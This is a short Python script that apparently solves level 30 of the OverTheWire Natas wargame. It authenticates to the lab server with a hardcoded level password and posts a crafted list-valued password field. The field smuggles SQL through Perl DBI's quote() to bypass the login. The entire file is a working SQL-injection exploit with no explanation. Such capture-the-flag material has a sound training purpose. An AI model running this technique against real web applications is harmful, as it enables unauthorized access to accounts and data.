import requests
import urllib
import base64

url='http://natas30.natas.labs.overthewire.org/index.pl'
s = requests.Session()
s.auth = ('natas30', 'Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X')

params={"username": "valid_username", "password": ["'lol' or 1", 4]}
print(s.post(url, data=params).text)